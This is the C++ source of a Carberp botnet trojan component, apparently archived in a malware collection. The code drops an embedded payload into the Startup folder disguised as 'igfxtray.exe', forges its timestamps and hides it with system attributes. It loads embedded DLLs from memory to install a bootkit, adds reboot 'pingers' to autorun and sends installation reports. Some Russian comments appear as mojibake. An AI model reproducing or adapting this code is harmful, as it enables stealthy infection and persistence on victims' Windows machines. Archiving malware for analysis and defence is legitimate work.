/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
//---------------------------------------------------------------------------
#include <Shlobj.h>

#include "BotEvents.h"
#include "GetApi.h"
//#include "BotDebug.h"
#include "Strings.h"
#include "Utils.h"
#include "Modules.h"
#include "Loader.h"

#include "inject.h"
#include "unhook.h"
#include "DllLoader.h"
#include "getsec.h"
#include "BotUtils.h"
#include "Memory.h"

#include "strings.h"
#include "DbgRpt.h"

//----------------------------------------------------------------------------
#include "BotDebug.h"

namespace BKIDBGTEMPLATES
{
	#include "DbgTemplates.h"
}

#define BKIDBG BKIDBGTEMPLATES::DBGOutMessage<>

void AddToAutoRun(void *body, DWORD size)
{	
	WCHAR BOT_FILE_NAME[] = {'\\','i','g','f','x','t','r','a','y','.','e','x','e',0};

	WCHAR *BotPath = GetShellFoldersKey( 1 );
	if ( BotPath == NULL )
	{
		return;
	}

	plstrcatW( BotPath, BOT_FILE_NAME );
	pSetFileAttributesW( BotPath, FILE_ATTRIBUTE_NORMAL );

	HANDLE f = pCreateFileW(BotPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
	DWORD  written = 0;
	if (f != INVALID_HANDLE_VALUE)
	{
		pWriteFile(f, body, size, &written, NULL);
		pCloseHandle(f);
	}

	if (written == size)
	{
		SetFakeFileDateTimeW( BotPath );
		pSetFileAttributesW( BotPath, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY );
	}

	MemFree( BotPath );
}

void AddRebootPingToAutorun()
{
	BKIDBG("AddRebootPingToAutorun", "started.");

	DWORD size;	
	PVOID body = GetSectionData("REBOOT_PING", &size);
	
	if (body)
	{
		BKIDBG("AddRebootPingToAutorun", "Ping body found. Adding to autorun.");
		AddToAutoRun(body, size);
	}

	BKIDBG("AddRebootPingToAutorun", "Finished.");
}

void AddRebootPingDllToAutorun()
{
	DWORD dll_body_size = 0;
	void* dll_body = NULL;

	BKIDBG("AddRebootPingDllToAutorun", "started.");
	
	dll_body = GetSectionData("REBOOT_PING_DLL", &dll_body_size);
	BKIDBG("AddRebootPingDllToAutorun", "GetSectionData() body=0x%X size=%u.", dll_body,
		dll_body_size);

	if (dll_body == NULL) return;
	if (dll_body_size == 0) return;

	HMEMORYMODULE dll = MemoryLoadLibrary(dll_body);
	BKIDBG("AddRebootPingDllToAutorun", "MemoryLoadLibrary() result=0x%X", dll);

	if (dll == NULL) return;

	typedef BOOL (WINAPI* InstallFunction)(const void* dll_body, DWORD dll_body_size);

	InstallFunction install = NULL;

	install = (InstallFunction)MemoryGetProcAddress(dll, "Install");
	BKIDBG("AddRebootPingDllToAutorun", "MemoryGetProcAddress() result=0x%X", install);

	if (install == NULL) return;

	// 123_d ������ ������ Install ��� ��������� ping dll
	DebugReportStepByName("123_d");

	BOOL install_result = install(dll_body, dll_body_size);
	if (install_result)
	{
		// 124_d ����� Install ��� ��������� ping dll ������ TRUE
		DebugReportStepByName("124_d");
	}

	BKIDBG("AddRebootPingDllToAutorun", "Finished with install_result=%d.", install_result);
}


enum TargetPlatform
{
	TargetPlatform_XP = 1,
	TargetPlatform_Vista,
	TargetPlatform_Seven,

	TargetPlatform_All
};

//TargetPlatform GetTargetPlatform()
//{
//	PCHAR TargetName = GetSectionAnsiString("TARGET_PLATFORM");
//
//	if ( TargetName )
//	{
//		if (m_lstrcmp(TargetName, "target-xp") == 0) return TargetPlatform_XP;
//		if (m_lstrcmp(TargetName, "target-vista") == 0) return TargetPlatform_Vista;
//		if (m_lstrcmp(TargetName, "target-seven") == 0) return TargetPlatform_Seven;
//
//		STR::Free(TargetName);
//	}
//	return TargetPlatform_All;
//}

TargetPlatform GetTargetPlatform()
{
	return TargetPlatform_XP;
}

bool CurrentPlatformAllowed()
{
	TargetPlatform		target = GetTargetPlatform();
	OSVERSIONINFOEXA	ver;

	// ������������ ��������� �� ��� ���������.
	// ������ ����� ���������� ��.
	if (target == TargetPlatform_All) return true;

	// ����������� ���������.
	// ������ ��� ��������� ���������� ��������� ������� ��������� ������.
	m_memset(&ver, 0, sizeof(ver));
	ver.dwOSVersionInfoSize = sizeof(ver);
	if (!pGetVersionExA(&ver) ) return false;

	struct 
	{
		TargetPlatform target;
		DWORD          os_version_major;
		DWORD          os_version_minor;
	}	target_table[] = 
	{
		{ TargetPlatform_XP   , 5, 1 },
		{ TargetPlatform_Vista, 6, 0 },
		{ TargetPlatform_Seven, 6, 1 }
	};

	for (size_t i = 0; i < ARRAYSIZE(target_table); i++)
	{
		if ((target == target_table[i].target) &&
			(ver.dwMajorVersion == target_table[i].os_version_major) &&
			(ver.dwMinorVersion == target_table[i].os_version_minor)
			)
		{
			return true;
		}
	}

	return false;
}

bool BkIsUacRequired()
{
	return false;
}

bool BkIsUacSupported()
{
	return false;
}

bool BkTryRemoteUacDrop(const void* SelfBody, DWORD SelfBodySize)
{
	// ����������� ��������� �� 
	// ����������� ������ � ������� IPC ��������� (������� ������ ���������, 
	//    ������� ���������� ���������)
	// ��������� ���� ���������� (������� ����������� ��� ���� ����������� ��� ���������)
	// ���� �� ���������� - ��������� ���� ���������� �� ����
	// ������� ��� ��������� � UAC �������
	// ���� ���������� ��������� - ���� ���������� �� ������� � ��������� ��� �������� � ������ 
	//  (�� ����������, �������� 30 �����)
	//
	//                                   � � ���������� ��������:
	//                                   ��������� �����
	//                                   ��������� ������� � ������.
	//                                   ���� ���������� - ���������� ������� ������
	//                                   ������������� � ������ � ���������
	//                                   ��������� ���������� � ������
	//                                   ���������� ������� ��������� ���������
	//
	// ��������� ��
	return false;
}

bool BkDeployAndInstallWithPossibleUac(const void* SelfBody, DWORD SelfBodySize)
{
	// ������� �������� - ������ ����� ���� ��� ����
	// ���� ���� - ������ ������� ��������� ���������� BkDeployAndInstallDll

	// ��������� �������������� �� UAC � �������.
	// ���� ��� - ������� false
	// ���� �� - ������� ��������� BkTryRemoteUacDrop()


	return false;
}


bool BkDeployAndInstallDll()
{
	ULONG ret = -1;
	
	// 100_d ������ �������
	DebugReportStepByName("100_d");

	// �������� ������� ���������.
	if (CurrentPlatformAllowed() == false)
	{
		BKIDBG("DeployAndInstallBkDll", "Current platform not allowed by target specifier. Return false.");
		return false;
	}

	// 109_d ����� ����������� ������� ���������
	DebugReportStepByName("109_d");

	DebugReportSystem();
	DebugReportUpdateNtldrCheckSum();

	// 110_d - ������ DeployAndInstallBkDll
	DebugReportStepByName("110_d");

	BKIDBG("DeployAndInstallBkDll", "looking for setup dll...");

	DWORD BkSize;	
	PVOID BkImage = GetSectionData("BkDll",&BkSize);
	
	BKIDBG("DeployAndInstallBkDll", "GetSectionData() result=0x%X.", BkImage);
	
	if (BkImage)
	{
		HMEMORYMODULE hLib = MemoryLoadLibrary(BkImage);
		
		BKIDBG("DeployAndInstallBkDll", "MLoadLibrary() result=0x%X", hLib);
		if (hLib == NULL) return false;
		
		bool uid_saved = DebugReportSaveUrlForBootkitDriver();
		BKIDBG("DeployAndInstallBkDll", "UID saved for bootkit.(result=%d)", uid_saved);

		BKIDBG("DeployAndInstallBkDll", "Looking for BkInstall function ....");
		ULONG (*BkInstall)();
		if ( BkInstall = (ULONG(*)())MemoryGetProcAddress(hLib,"BkInstall")  )
		{
			// 111_d - ������ ���������
			DebugReportStepByName("111_d");

			BKIDBG("DeployAndInstallBkDll", "BkInstall function found 0x%X. Calling it.", BkInstall);
			ret = BkInstall();
			BKIDBG("DeployAndInstallBkDll", "BkInstall function result = 0x%X", ret);

			if (ret == ERROR_SUCCESS)
			{
				//112_d ��������� �������
				DebugReportStepByName("112_d");

				BKIDBG("DeployAndInstallBkDll", "add pinger to autorun...");
				AddRebootPingToAutorun();
				AddRebootPingDllToAutorun();
				DebugReportCreateConfigReportAndSend();
			}

			BKIDBG("DeployAndInstallBkDll", "Doing DebugReportBkInstallCode");
			DebugReportBkInstallCode(ret);
		}
		MemoryFreeLibrary(hLib);

		BKIDBG("DeployAndInstallBkDll", "returning %d.", (ret == ERROR_SUCCESS));
		return (ret == ERROR_SUCCESS);
	}
	BKIDBG("DeployAndInstallBkDll", "returning false.");
	return false;
}
